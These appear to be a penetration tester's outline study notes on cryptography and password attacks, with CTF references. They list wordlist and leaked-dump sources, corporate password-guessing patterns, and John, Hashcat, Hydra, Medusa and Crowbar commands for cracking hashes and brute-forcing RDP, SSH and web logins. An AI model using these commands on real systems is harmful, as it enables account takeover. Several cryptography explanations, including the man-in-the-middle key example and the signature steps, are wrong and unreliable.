Password Cracking & Cryptography:
================================
Theory:
	Cryptography:
		Basics:
			Cryptography Goals:(3)
				1. Confidentiality:
				2. Intregrity:
				3. Ava
				Note:
					These goals are also known as "CIA Triad".
		Types:(2)
			1. Key-Based Cryptography:
				Basics:
					Terms:
						Key:
							A key is a string which is used by encryption/decryption algorithms to either encrypt/decrypt the data.
					Components:
						A. PlainText:
							It refers to the orignal message before encryption.
						B. Cipher_Text:(aka Encrypted_Text)
						C. Key-Based Cryptography Algorithm:
							Read "Key-Based Cryptography Algorithms" Section below.
					Key-Based Cryptography Processes:(2)
						A. Encryption:
							Basics:
								Process of converting a message(plaintext) into encrypted_text using algorithms is called encyrption.
							Analtyical Form:
								Encryption_Algo(Plain_Text, Encryption_Key) => Encrypted_Text
						B. Decryption:
							Basics:
								Process of converting a cipher_text into the orignal message is called decyrption.
							Analtyical Form:
								Decryption_Algo(Encrypted_Text, Decryption_Key) => Plain_Text
				Key-Based Cryptography Algorithms:
					Types based on Encryption & Decryption Keys:(2)
						A. Symmetric Cryptography:(aka Single Key Cryptography)(aka Private/Secret Key Cryptography)(aka Conventional Cryptography)
							Basics:
								Note:
									If Encryption_Key is same as Decryption_key, then its Symmetric Encryption.
								Symmetric Cryptography algorithms use a "Symmetric Key" to both encrypt and decrypt the data. This key is also refered to as "Private Key" in case of Symmetric Cryptography.
								Advantages:
									Its faster than Asymmetric Encryption.
								Disadvantage:
									Unsafe as both keys are same.
							Types:(2)
								1. Stream Algorithms:(aka Stream Ciphers)
									Basics:
										Stream ciphers break down the plaintext message into single bits, which are then encrypted into ciphertext using "key bits"
										Ciphertext resulting from the use of this kind of algorithm is the same size as the original cleartext.
										Disadvantages:
											It requires a lot of randomness, as each bit is to be encrypted with a unique key stream.
									Types:
										A. KAK:(Key Auto-Key)(aka Synchronous Stream Ciphers)
										B. CTAK:(CipherText Auto-Key)(aka Asynchronous Stream Ciphers)(aka Self-Synchronizing Stream Ciphers)
									Important Stream Ciphers:
										Salsa20:
											software and hardware implementations
										ChaCha20:
											TLS 1.3
										RC4:(Rivest Cipher 4)
											wireless networks
										A5:
											GSM cellular networks
								2. Block Algorithms:(Block Ciphers)
									Basics:
										Terms:
											IV:(Initialization Vector)
												Encryption algorithms are deterministic in nature, This means that the same input will always result in the same output. This makes encryption weaker, as it makes it vulnerable to cryptanalysis and known-text attacks.To face this issue, IVs are implemented.
												An IV is an extra piece of information that is different each time the algorithm is executed. It is used to generate the encryption key or to preprocess the cleartext, usually through an XOR operation. IVs are attached to the ciphertext, as the recipient has no way of knowing them beforehand.
										Block Ciphers break down plaintext message into fixed-length blocks before converting them into ciphertext using the private key.
										Also, the ciphertext resulting from a block cipher is always a multiple of the block size.
										Uses:
											To encrypt bulk data
									Mode of Operation:
										Basics:
										Modes:(7)
											A. ECB:(Electronic Code Book Mode)
												Basics:
													there is no use of IV and each block is encrypted independently with the same key.
												Encryption:
												Decryption:
											B. CBC:(Cipher Block Chaining Mode)
												Basics:
													blocks are encrypted sequentially; an IV is applied to the first block, and the resulting ciphertext in each block is used as the IV to encrypt the next one
												Encryption:
												Decryption:
											C. CFB:(Cipher Feed Back Mode)
												Basics:
												Encryption:
												Decryption:
											D. OFB:(Output Feed Back Mode)
												Basics:
												Encryption:
												Decryption:
											E. CTR:(Counter Mode)
												Basics:
													most convenient and secure method
													Blocks are encrypted independently using the same IV plus a counter that is different for each block. This makes the mode capable of processing all blocks of a message in parallel and having different ciphertext for each block, even if the cleartext is the same.
												Encryption:
												Decryption:
											F. GCM:(Galois Counter Mode)
												Basics:
												Encryption:
												Decryption:
											G. XTS:(XEX Tweakable Block Cipher with Ciphertext Stealing Mode)
												Basics:
												Encryption:
												Decryption:
									Important Block Ciphers:
										DES:(Data Encryption Standard)
										3DES:(Triple DES)
										AES:(Advanced Encryption Standard)
										Blowfish:
										Twofish:
										RC5:(Rivest Cipher 5)
							Important Applications:
							Important Symmetric Algorithms:
								DES:(Data Encryption Standard)
									Read DES In CTF Section below
								2DES:(Double DES)
								3DES:(Triple DES)
									This algorithm applies the DES algorithm three times to each block
								AES:(Advanced Encryption Standard)
									Read AES In CTF Section below
								RC4:(Rivest Cipher 4)
						B. Asymmetric Cryptography:(aka Public Key Cryptography)
							Basics:
								Note:
									If Encryption_Key is different from Decryption_key, then its Asymmetric Encryption.
								Asymmetric Encryption algorithms use a pair of keys, specifically "Public & Private Key" as explained below:
									1. Private Key:
										Private key is called Private as its only known to the owner.
										Private key is used for Decryption, ie, to decrypt a message:
											Decryption_Algo(Encrypted_Text, Private_Key) => Plain_Text
										Note:
											For security purposes, Private key is kept hidden/securely by the owner and is mostly encrypted itself via some password. When, a key is encrypted itself, the password used to decrypt it, is called passphrase:
												Decryption_Algo('Encrypted_Private_key', PassPhrase) => Orignal_Private_Key
									2. Public Key:
										Public key is used for Encryption, ie, to encrypt an decrypted message:
											Encryption_Algo(Plain_Text, Public_Key) => Encrypted_Text
										Note:
											Public key is shared with everyone and is also stored on webservers to be made accessible by others.
									Example:
										Let's say i wanna send a confidential message to a site owner, so i use his public key to encrypt the message and share it to him, so that only he can read the orignal message using his private key, which is only known to him.
								Advantages:
									More secure than Symmetric Encryption.
								Disadvantages:
									Slower as compared to Symmetric Encryption.
							Types:
							Important Applications:
								Digital Signature:
									Basics:
										Its a mechanism based on asymmetric key cryptograpy, used to verify:
											A. Authenticity of a digital document/message/email(DKIM)/transaction
											B. Non-Reproduction of message
											C. Intregrity, ie, message/document is not altered/forged/manipulated
									Working:
										Step-1:
											Sender will generate a "hash" by sending his private key and 'orignal message' to some 'Digital Signature generating Algorithm(aka Signing Algorithm)'. This hash is called 'Digital Signature.'
										Step-2:
											Reciever will generate the 'message' and sender's public key to "Digital Signature verification/decryption Algorithm".
										Step-3:
											Reciever will then compare 'original message' and 'message' to check validity/integrity.
									Dis-Advantage:
										Lack of Confidentiality:
											Since, we need to send orignal message along with the digital signature, any attacker can see it via MITM. 
											Can we use SSL/TLS for it?
									Usage:
										To check authenticity/integrity of a document/message/transaction/E-Mail
										DKIM E-Mail Authentication Mechanism
								Digital Certificates:
									Basics:
										A digital certificate is like a drivers license
										It’s a form of electronic identification for websites and organizations. Secure connections between two communicating machines are made available through PKI because the identities of the two parties can be verified by way of certificates.
										Types:(3)
											A. Individual Digital Signature Certificates:(aka Signing Certificates)
												These certificates are used to identify a person and include personal information.
												They can be used to sign electronic documents and emails(i.e., to provide Digital Signatures)
											B. Server Certificates:
												These certificates are used to identify a server and contain host name or IP address of that server.
												They are used for one-layer or two-layer SSL to ensure secure communication of data over a network.
											C. Encryption Certificates:
												These certificates are used to encrypt a message using the public key of the recipient to ensure data confidentiality during transmission.
									PKI:(Public Key Infrastructure)
										Basics:
											PKI Governs encryption keys(both Public and Private) by issuing and managing Digital Certificates.
									CA:(Certification Authorities)
										Basics:
											It is responsible for creating Digital Certificates.
											CAs have a chain of trust, with a Root CA at the top.
											Root CA:
												Root CA has self-signed certificats unlike other CA's.
												Root CAs are automatically trusted by your device, OS, or browser from install
										Types:(2)
											A. Private CA:
												Its responsibile for issuing certificates only for members of its own organization, and is likewise trusted only by members of its own organization.
											B. Public CA:
												Its responsibile for issuing certificates for any member of the public, and must be trusted by the public.
									X.509 Certificate:
										Basics:
											Its used for providing Digital Certificates and are either self-signed or signed by a CA.
											It contains a public key and an identity (a hostname, or an organization, or an individual)
										X.509 Entensions:(3 Types)
											Note	
												Terms:
													PKCS => Public-Key Cryptography Standards
													CMS => Cryptographic Message Syntax => Another name for PKCS#7
											A. Signing Request Certificates:
												1. .csr:(Certificate Signing Request)
													Actual Format is PKCS10
													It includes key details of the requested certificate as well as the public key of the certificate to get signed.
													These get signed by the CA and a certificate is returned as Public Certificate(many formats)
													Uses:
														They are generated for submission to CA to get signed
											B. Public Certificates:
												1. .der:(Distinguished Encoding Rules)
													It contains ASN.1 encoded certificate
												2. .pem:(Privacy Enhanced Mail)
													Containes base64 encoded DER certificate enclosed between "-----BEGIN CERTIFICATE-----" and "-----END CERTIFICATE-----"
													Note:
														It can be also used as .csr certificate as a .csr certificate can be translated into a .pem certificate
												3. .key:
													Its a .pem certificate containing just the private key of a specific certificate.
													Note:
														File permission on .key files are very important as some programs may refuse to load these certificates if file permissions are set wrong
												4. PKCS#7 based:(8)
													Note:
														Information about PKCS#7 extensions is very limited and therefore i wasnt able to find anymore info than specified.
													A. .p7
													B. .p7a
													C. .p7b
														Actual format is PKCS7(Public-Key Cryptography Standards)
														A P7B file only contains certificates and chain certificates (Intermediate CAs), not the private key in base64 encoded ASCII
														The certificates having P7B/PKCS#7 format are contained between the “—–BEGIN PKCS7—–” and “—–END PKCS7—–” statements.
														Used by:
															Windows for certificate interchange in MS IIS/MS Exchange Server
															Java Tomcat
													D. .p7c
														Same as .p7b
													E. .p7z:
													F. .p7m
													G. .p7s
													H. .keystore
														It is same as .p7b, however its usage is limited to Java
												5. PKCS#8 based:
													.pk8
														Its stores encrypted private key
														https://knowledge.digicert.com/solution/SO26449.html
												6. PKCS#12 based:(3)
													A. .pfx:
														Its a password protected container certificate that contains both public and private certificate pair.
														Uses:
															To import and export certificates and private keys on windows
													B. .p12:
														same as .pfx
													C. .pkcs12:
														same as .pfx/.p12
												7. .cer:(Canonical Encoding Rule)
													It contains certificate data either in .der or .pem file format. we need to use "file" command to know what it contains exactly.
												8. .cert:(Certificate)
													same as .cer
												9. .crt:(Certificate)
													same as .cert/.cer
											C. Deauthorization Request Certificates:
												1. .crl:(Certification Revocation List)
													CA produces these certificates to deauthorize certificates before expiration
								Need of PKI:
									Issue with traditional Key Based Algorithms:
										Lets say Mr. Hacker did MITM and grabbed Public key of Bob, using which Mr Hacker created his own private key and then generated a new public key.
										Alice sent Bob an encyrpted message which Mr hacker saw  via MITM. He decrypted it using his new public key and to be more malicious, re-encrypted it.
										In this scenario, goal of "Key-Based Encryption" failed. Thats why we use PKI.
							Important Asymmetric Algorithm:
								RSA:
								DSA:
								ECC:(Elliptic Curve Cryptography)
								Diffie-Hellman Key Exchange:(aka Diffie-Hellman)
			2. Hash Functions:
				Basics:
					Terms:
						Hash Value:(aka Message Digest)
							Its output of the hash function.
					Hashing:
						Analtyical:
							Hash_Function(Variable_Length_Message) => Fixed_Length_Hash
					Its different from encryption as there is no key, and it’s meant to be non-reversible(impossible to go from the output back to the input)
					It takes input data of any size, and creates a summary or "DIGEST" of that data. The output is a fixed size.
					The output of a hash function is normally raw bytes, which are then encoded commonly in base 64 or hexadecimal.
					Known Issues:
						Hash Collision:
							It occurs when 2 different inputs give the same output. Due to the pigeonhole effect, collisions are not avoidable. The pigeonhole effect is basically, there are a set number of different output values for the hash function, but you can give it any size input. As there are more inputs than outputs, some of the inputs must give the same output. If you have 128 pigeons and 96 pigeonholes, some of the pigeons are going to have to share.
				Important Applications:
					A. Password Storage:(Storing Hashes on Servers)
						Due to a lot of data breaches, companies started storing hashes instead to cleartext passwords, so that, if database got leaked, then an attacker would have to crack each password to find out what the password was. That sounds fairly useful.
						Issues:(2)
							1. What if two users have the same password as a hash function will always turn the same input into the same output
							2. Attacker can create a "Rainbow Table" to break the hashes.
					B. Data Integrity Check:
						Basics:
							If you put the same data in, you always get the same data out. If even a single bit changes, the hash will change a lot. This means you can use it to check that files haven't been modified or to make sure that they have downloaded correctly.
						HMAC:(Hash-based MAC)(aka Keyed-Hash MAC)
							Basics:
								HMAC is a method of using a cryptographic hashing function to verify the authenticity and integrity of data. A HMAC can be used to ensure that the person who created the HMAC is who they say they are (authenticity), and that the message hasn’t been modified or corrupted (integrity). They use a secret key, and a hashing algorithm in order to produce a hash.
				Important Hash Functions:
					MD:(Message Digest)
						Basics:
						Types:(4)
							A. MD2:
							B. MD4:
							C. MD5:
							D. MD6:
					SHA:(Secure Hash Algorithm)
						Basics:
						Types:(4)
							A. SHA-0:
							B. SHA-1:
							C. SHA-2:
							D. SHA-3:
					RIPEMD:(RIPE Message Digest)
						Basics:
						Types:(5)
							A. RIPEMD:
							B. RIPEMD-128:
							C. RIPEMD-160:
							D. RIPEMD-256:
							E. RIPEMD-320:
					Whirlpool:(aka WHIRLPOOL)
						Basics:
						Types:(3)
							A. Whirlpool-0:
							B. Whirlpool-T:
							C. Whirlpool:
	Important Authentication Protocols:
		SSH Key Authentication:
			Read SSH Section of Active Information Gathering Sheet
		LM Authentication:
			Read Windows Internals Sheet
		NTLM Authentication:
			Read Windows Internals Sheet
		Kerberos Authentication:
			Read Windows Internals Sheet
Password Attacks:
	Basics:
		Attack Types:
			Rainbow Table:
				Its a lookup table of hashes to plaintexts, so you can quickly find out what password a user had just from the hash. A rainbow table trades time taken to crack a hash for hard disk space, but they do take time to create.111
	Password Wordlists:
		Note:
			Read Wordlists Sheet to read about:
				Basics
				Wordlists other than Password wordlists
		Note:
			Always sort and uniq any wordlist before using it to optimize the process
		Pre-built Password Wordlists:
			InBuilt:
				/usr/share/wordlists/rockyou.txt
			Additional:
				seclists:(apt-get install seclists)
					seclists/passwords/10k-most-common.txt => smaller than rockyou.txt
				crackstation-human-only:
					crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
					64 Million real passwords leaked from a lot of databases
				m3g9tr0n_Passwords_WordList_CLEANED:
					forums.pirate-server.com/data/m3g9tr0n_Passwords_WordList_CLEANED.zip
					122 Million Passwords
				Leaked Password Dumps:
					https://weakpass.com/wordlist
		Creating Password Wordlist:
			CeWL:
				Read Wordlists sheet.
			Crunch:
				Read Wordlists sheet.
			CUPP:
				Read Wordlists sheet.
		Editing Password Wordlist:
			Understanding Password Patterns and Policy:
				Based on beahviour, we can edit wordlists, It OPTIMIZES PASSWORD CRACKING ATTACKS.
				Password Policies:
					it is important to know password policy of a company, before cracking
					Finding the policy:
						crackmapexec -i <ip> -u user -p pass --pass-pol
					Password Rotation(Policy to maintain security):
						to constantly change password after a fixed period of time
						users invented a way to remember to do this
						90 Days Roation Policy:
							Trick => Seasons
							Winter2012
						30 Days Roation Policy:
							Trick => Months
							September29!
						Same root Word: (any time period of rotation)
							Example-1:
								password => Password15
								Root word => Password
								Next Password => Password16
								Next Password => Password17
							Example-2:
								password => Password!
								Root word => Password
								Next Password => Password@
								Next Password => Password#
				Behaviour to use a Number:
					90% of the time => End
					sometimes at begining (lower percentage)
				Behaviour to use a Special Character:
					At End (90%)
					In Begining
					Between 2 words (Hello!World)
					Most common special chars => !@#
				Keyboard Based Password Patterns:
					when password >= 12(.gov)
					it is based on hand, it has different types:
						2x6:(2 hands x 6 characters each hand)
							left => qwe123
							right => TYU%^&
							Using them:
								qwe123TYU%^&[number] => qwe123TYU%^&9
									mostly number is last digit of year number
						other types => 2x2, 2x4, 2x5
				Most popular patterns in corportates:
					9 characters:
						ULLLLLLLD
						ULLLLDDDD
						ULLLLLLDD
						ULLLLLDDD
						ULLLDDDDS
						ULLLLLDDS
						SULLLDDDD
					8 characters:
						ULLLLLDD
						ULLLDDDD
			Using Bash:	
				for i in $(cat initial_list); do echo $i; echo ${i}2019; echo ${i}2020; done > final_list.txt
			PW-Inspector:
				Read Wordlists sheet.
			Using Hashcat Rules:
				Read Hashcat Section below.
			Using John Rules:
				Read John Section below.
		Note:
			How to decide the password length?
				Recon based on the enviroment. However is nothing is there to guide us for password min length, then assume it to be 1.
	Hash Cracking:
		Basics:
			Attack Types:(5)
				A. Dictionary Attack:(aka Wordlist attack)
					read line by line from a wordlist and try each line as a password candidate.
				B. Combinator Attack:
					Appends each word of a dict1(left_dict) to each word of dict2(right_dict)
				C. Mask Attack:
					a form of targeted brute-force attack by using placeholders for characters in certain positions
					Note:
						Mask Attack is NEW Brute-force Attack
					Placeholder:
						position of character of password
						A Placeholder is indicated by the ? letter followed by charset:
							?l => LowerCase
							?u => UpperCase
							?d => Digit 
							?h => 0123456789abcdef (hex)
							?H => 0123456789ABCDEF (HEX)
							?s => «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ (Symbols)
							?a => All Except Binary
							?b => 0x00 - 0xff
					Mask:
						String of the Placeholders
				D. Hybrid Attack:
					Type of Combinator attack where one side is dictionary and the other side is Mask or Rule
				E. Rule Attack:
					generates permutations against a given wordlist by modifying, trimming, extending, expanding, combining, or skipping words.
		Hash Identification:
			HashID:
				Basics:
				Usage:
					hashid hash.txt
			Hash-Identifier:
				Basics:
				Usage:
					hash-identifier
			https://hashcat.net/wiki/doku.php?id=example_hashes => look for prefix of hash
			NOTE:
				MD5, MD4, NTLM are very identical
		Online Hash Cracking:(important and helpful)
			crackstation.net => best
				it cracks the hash and it cracks hash of every type
			google the hash directly
		Offline Hash Cracking:
			John:(aka JTR(John The Ripper))(CPU only)
				Basics:
					John Files:
						john.pot:
							john by default stores all the cracked pass in john.pot file
						john.rec:
							When we press Ctrl-C, John pauses cracking and saves the information about the progress of the current session to a file ~/.john/john.rec
						john.conf:
							Rule File
					Cracking Modes:(8)
						1. Wordlist Mode:
							This is the simplest cracking mode supported by John.  All you need to do is specify a wordlist and password file.
						2. Single Crack Mode:
							It uses login names, "Full Name" fields, and users' home directory names as candidate passwords, along with rules applied
						3. Incremental Mode:
							It can try all possible character combinations as passwords. However, it is assumed thatcracking with this mode will never terminate because of the number of combinations being too large!
						4. External Mode:
							To use this mode, a section in configuration file is created which contains function code that john will use to create the wordlist to try against the password file.
						5. Markov Mode:
							https://github.com/openwall/john/blob/bleeding-jumbo/doc/MARKOV
						6. Mask Mode:
							It uses a mask to create the wordlist to try against the password file
						7. Subsets Mode:
						8. Regex Mode:
					John Rules:
				Creating Hashes:
					SSH2John:
						Read Active Information Gathering Sheet
					Keepass2John:
						Basics:
						Usage:
							keepass2john abcd.kdbx => Gives hash of keepass
						Usage:
							zip2john abcd.zip
						Usage:
							rar2john
						Usage:
							kirbi2john => kerberos tickets(TGTs)
						Usage:
							gpg2john => gpg keys
					Note:
						Always save hashes found as file.john
				Cracking Hashes:
					Usage:
						john hash.txt --wordlist= --format=hash_format => Wordlist Attack
						john hash.txt --wordlist= --format=hash_format --rules => Hybrid
						john --mask='?d?d?d?d?d?d' vnc.hash => Mask Attack
						John Hashes:
							
						Cracking Encrypted SSH private key:(id_rsa)
							./ssh2john.py id_rsa > idcrack
								locate ssh2john
							john --wordlist=rockyou.txt idcrack
								john automatically recongnizes the hash_type most of the times
						Editing Wordlists:
							/etc/john/john.conf => rule file
								append $[0-9] => to add a number in end (0-9)
							john --wordlist=initial.txt --min-length=x --max-length=y -mask=?w --rules=rule_name --stdout > final.txt
						Flags:
							--wordlist => 
							--format=hash_format
								pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
							--stdin => 
							-pipe => 
							--fork x => create x processes
							--rules=rule_name
							--stdout => It is used when using John to edit wordlists
							--min-length=x
							--max-length=x
							-mask=Placeholders:
								?l => lowercase
								?u => uppercase
								?d => digits
								?s => special
								?w => orignal word from initial wordlist
							--session=<name> => provide a name to current session
							--status=session_name => Shows status of specified session
							--restore=session_name => Resume the specified session
							--pot=./list.pot => john will write all cracked password into list.pot
							--show => Shows cracked passwords (shows john.pot file)
							--test => To benchmark
						Note:
							John will not take wordlist.txt.gz file. It only accepts ASCII text files.
			Hashcat:(CPU/GPU)
				Basics:
					Hashcat Files:
						Hashcat Mask file:(.hcmask)
							Its a set of masks stored in a single plain text file with extension .hcmask.
							Example:
								?u?l?l?l?l?s
								?u?l?l?l?l?l?s
								?l?l?l?l?l
								?l?l?l?l?l?s
					Hashcat Rules:
				Usage:
					hashcat -m hash_type -a attack_type hash.txt wordlist.txt --force
					Hashcat Rules:
						hashcat --force --stdout initial_list -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule
					Flags:
						--force => to make hashcat run on cpu
						--stdout
						-r => hashcat rule
						-b => to benchmark
						-j => rule to append at end of each word of left dict
							-j '$-' => append -
						-k => rule to append at end of each word of right dict
							-k '$!' => append !
						-m => hash type
						-a => Attack Mode(-a 0 to -a 7)
							-a 0:
								Dictionary Attack:(aka Wordlist Attack)(aka Normal Attack)
									Basics:
										Reads wordlist line by line and try each line as a password candidate
									Implementation:
										hashcat -m x -a 0 hash.txt rockyou.txt
								Rule Based Attack
							-a 1:
								Combinator Attack:
									Basics:
										Appends each word of a Dict1(left_dict) to each word of Dict2(right_dict)
									Implementation:
										hashcat -m x -a 1 hash.txt dict1.txt dict2.txt
										-j => rule to append at end of each word of left dict
											-j '$-' => append -
										-k => rule to append at end of each word of right dict
											-k '$!' => append !
							-a 2:
							-a 3:
								Mask Attack:
									Basics:
										Read Mask Attack under Types of Attacks Section above
									Usage:
										hashcat -m 0 -a 3 hash.txt mask_file.hcmask
							-a 4:
							-a 5:
							-a 6:
								Hybrid Attack:(Wordlist + Mask)
									Basics:
										Type of Combinator attack where first side is Dictionary and the second side is Mask
									Usage:
										hashcat -m 0 -a 6 hash.txt dict.txt ?d?d?d?d
											if dict is abcd => abcd0000 to abcd9999
								Rule Based Attack
							-a 7:
								Hybrid Attack:(Mask + Wordlist)
									Basics:
										Type of Combinator attack where first side is Mask and the second side is Dictionary
									Usage:
										hashcat -m 0 -a 6 hash.txt ?d?d?d?d dict.txt
											if dict is abcd => 0000abcd to 9999abcd
								Rule Based Attack
							-a 8:
							-a 9:
								Association Attack:
						Rule Based Attack:(-a 0 -m 0)
							Basics:
								Rules:
									Pre-Defined Rules:
										/usr/share/hashcat/rules/
									Making Custom rules:
										we make .rule file using inbuilt rules
										inbuilt rules:
											: => Do Nothing
											l => Lowercase all letters
											u => Uppercase all letters
											c => 1st character upper, rest lower
											$X => append X to end
											^X => add X to front
											sXY => replace all X with Y
										Example:
											file.rule:
												:
												l
												u
												c
												$1
												$2
												$1$2sa@
							Usage:
								hashcat -a 0 -m 0 file.hash  rockyou.txt -r rules.rule --debug-mode=1 --debug-file=matched.rule --force
									--debug-mode=1:
										Write the rule whenever it successfully cracks a password
									--debug-file=matched.rule:
										matched.rule looks like this:
											79 $1
											21 $1$!
											<hash_number> <rule_used>
										it helps us to find most common patterns used by people, general debugging
	Password Bruteforcing:
		Network Password Attacks:(attacks on services running on ports like ftp/http/etc)
			Web Login Bruteforcing:
				Using Hydra:
					Read Web Auth Modules Section of Hydra
				Using Burp:
					Read Burp Intruder Section in WebApp Pentesting Sheet
			Tools:
				Crowbar:(apt-get install crowbar)
					Basics:
						Unique Features:
							1. Bruteforcing SSH using SSH Keys:
								It bruteforces against all SSH Servers using any SSH Keys found.
							2. Bruteforcing VNC using VNC Keys:
								It bruteforces against all VNC Servers using any VNC Keys found.
					Usage:
						crowbar -b rdp -s host.com -u admin -C password.txt -n 1 => bruteforcing password
						crowbar -b rdp -S targets.txt -u domain_name\\user_name -c pass1234
						crowbar -b rdp -s <ip> -U user.txt -c pass1234 -n 1
						crowbar -b rdp -S target.txt -U user.txt -C Pass.txt -n 20
						crowbar -b rdp -S target.txt -u root -k id_rsa -n 1
						Flags:
							-b <protocol>:
								Supported protocols:(4)
									1. Openvpn => -b openvpn
									2. RDP with NLA Support => -b rdp
									3. SSH Private Key Authentication => -b sshkey
									4. VNC Key Authentication => -b vpn (or vnc?)
							-p => port on which service is running
							-s => target ip
							-S targets.txt
							-u user1234
							-U user.txt
							-c pass1234 
							-C pass.txt
							-k ssh/vnc key
							-m openvpn.config file
							-n => threads
							-o out.txt => logs only successful attempts
				Medusa:
					Basics:
					Usage:
						medusa -h host.com -U user.txt -P wordlist -M http -n 8080 -f
						Flags:
							-d => To show all modules.
							-M <module_name>
							-m <parameters>:
								Example:
									medusa -h host.com -u username -P wordlist -M http -m DIR:/admin
							-n => specify port
							-f => stop after first valid creds
							-t => number of logins to be tested concurrently
				Hydra:
					Basics:
						Hydra Files:
							hydra.restore
					Usage:
						hydra -l admin -P wordlist.txt protocol://IPv4 -t 4
						hydra -l admin -P wordlist.txt -6 protocol://[IPv6] -t 4
						hydra -L user.txt -P wordlist.txt protocol://ip:port -t 4
						Hydra Modules:
							hydra -U <module_name> => Shows info and flags related to the specified module
							Web Auth Modules:
								Basic Authentication:
									hydra -L users.txt -P words.txt <ip> http-head /login_page/
									hydra -L users.txt -P words.txt www.site.com http-head /login_page/
								Digest Authentication:
									hydra -L users.txt -P words.txt <ip> http-get /login_page/
								Forms:
									Basics:
										Request String:
											It contains the following elements seperated by a Colon(:), and the whole string is enclosed in Double Quotes (")
											A. Login page:
												Example:
													/login
													/admin.php
											B. List of parameters along with placeholders
												Placeholders => parameters which are bruteforced
												Example:
													/login.php:log=^USER^&pwd=^PASS^
													/login.php:log=username&pwd=^PASS^
											C. Failing or Success Strings:
												Failing String:(F)
													Example:
														:F=Login Failed
												Success String:(S)
													Example:
														S=Welcome To Admin Panel
												Note:
													If we are specifying only Faliure String, we can do that either way:
														:F:Bad Login
														:Bad Login
											D. Header String:(H)
												H=Cookie: <value>
												Example:
													H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low
									HTTP Form:
										Post:	
											hydra -l admin -P pass.txt http://ip http-form-post "Request String"
											hydra -l admin -P pass.txt http://ip http-form-post "/admin/login.php:user=admin&pass=^PAS
											S^:INVALID LOGIN" 
										Get:
											hydra -l admin -P pass.txt http://www.website.com http-get-form "login.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
									HTTPS Form:
										Post:
											hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=value123&user=^USER^&pass=^PASS^:Bad login"
										Get:
						Flags:
							-l user1234
							-L users.txt
							-p pass1234
							-P pass.txt
							-M targets.txt
							-e => Combination
								-es => Try 'username' as Password
								-er => Try 'password' as Username
								-en => Try NULL Password
							-6 => When we test IPv6 targets
							-S => Used when performing a connection using SSL
							-t x => Threads
							-w x => Amount of seconds to wait between two consecutive requests
							-f => Stop bruteforcing for the current target after first pair of cred is found for the current target
							-F => Stop bruteforcing after first pair of cred is found for any target
							-R => Restore a hydra session using hydra.restore file
							Note:
								-f and -F work same if -M is not used.
				Note:
					Do not bruteforce Windows IIS login page as it lockouts temporarily
		Application Password Cracking:
			SAM Hash Cracking:
				Read AD Exploitation Sheet
			Shadow Hash Cracking:
				Read Linux Privesc Sheet
			Cisco:
				Cisco Type 0:
					Basics:
						It has clear text password
				Cisco Type 4:
					Basics:
					Cracking Cisco Type 4 Hash:
						John:
							john --format=Raw-SHA256
						Hashcat:
							hashcat -m 5700
				Cisco Type 5:
					Basics:
					Cracking Cisco Type 5 Hash:
						John:
							john --format=md5crypt
						Hashcat:
							hashcat -m 500
				Cisco Type 7:
					Basics:
						This uses vigenere cipher
					Cracking Cisco Type 7 Hash:
						Ciscot7:(https://github.com/theevilbit/ciscot7)
							Basics:
							Usage:
								./ciscot7.py -d -p 0236244818115F3348
								Flags:
									-d => 
									-p => 
				Cisco Type 8:
					Basics:
					Cracking Cisco Type 8 Hash:
						John:
							john --format=pbkdf2-hmac-sha256
						Hashcat:
							hashcat -m 9200
				Cisco Type 9:
					Basics:
					Cracking Cisco Type 8 Hash:
						John:
							john --format=scrypt
						Hashcat:
							hashcat -m 9300
				Used in HTB::Hiest
			VNC:
				VNCPwd:
					Basics:
						Installation:
							Grab vncpwd from https://github.com/jeroennijhof/vncpwd
							gcc -o vncpwd vncpwd.c d3des.c
					Usage:
						vncpwd "ASCII string of encrypted password"
			Zip:
				Fcrackzip:
					Basics:
					Usage:
						fcrackzip -D -p rockyou.txt file.zip
						Flags:
							-D => dictionary
							-p => 
			Rar:
			Pdf:
			PCAP:	
				Pcredz:(https://github.com/lgandx/PCredz.git)
					Basics:
						This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.
					Usage:
						./Pcredz -f file.pcap => extract credentials from a pcap file
						./Pcredz -i eth0 => extract credentials from a live packet capture on a network interface
						Flags:
							-f => 
							-i => 
	Password Spraying:
		Read AD Exploitation Sheet
	Attacking Encryption Algorithms:
		Common Ciphers:
			Subsitution Cipher:
				Basics:
				Cracking Subsitution Cipher:
					https://quipqiup.com:
						quipqiup is a fast and automated cryptogram solver. It can solve simple substitution ciphers very easily and then use statistics to sort results into whats the best possible plaintext.
				Important Subsitution Ciphers:
					ROT13:
						Basics:
			Vigenre Cipher:(used in HTB::Brainfuck)
				Basics:
					It has 3 parts:
						CT => Cipher Text
						PT => Plain Text
						key
					Encoding:
						PT + key = CT
					Decoding:
						PT = CT - key
						key = CT - PT		
				https://www.dcode.fr/vigenere-cipher
					Paste the encrypted text and then press "Automatic Decryption", "Decrypt" => this will show us possible outcomes with keys, copy the key of most suitable decryption.
					Paste the encrypted text and key selcted in "KNOWING THE KEY/PASSWORD:" and then press "Decrypt"		
			Brainfuck Cipher:
				https://copy.sh/brainfuck/
			Ook! Cipher:(HTB::Frolic)
				It has only 3 syntaxes => "Ook." "Ook!" "Ook?"
				Ook! Short-hand Cipher:
					It has only 3 syntaxes => "." "!" "?"
				https://www.cachesleuth.com/bfook.html => for both Ook! and Ook! short-hand cipher.	
		Asymmetric Encryption:
			RSA In CTF:(Rivest Shamir Adleman)
				Basics:
					Its an asymmetric encryption algorithm => Meaning it has a pair of public-private keys 
					The key variables for RSA are:
						m => message(plaintext) => Its converted into a number(hex(m))
						n => modulus
							n=p*q
								p and q => prime numbers
						d => private exponent
							phi(n) => lcm(p-1, q-1) => d
								phi(pq) = lcm(phi(p), phi(q))
								phi is Euler’s Totient Function.
						e => public exponent
							Requirements:
								1 < e < phi(n)
								gcd(e,phi(n))=1
							Most common value of e is 65537 =  0x10001
							we use hex value of e. 
						c => ciphertext
						Note:
							0 < m < n
					Keys:(Encoded in .pem format)
						Public Key => array(n, e)
							Example:
								-----BEGIN PUBLIC KEY-----
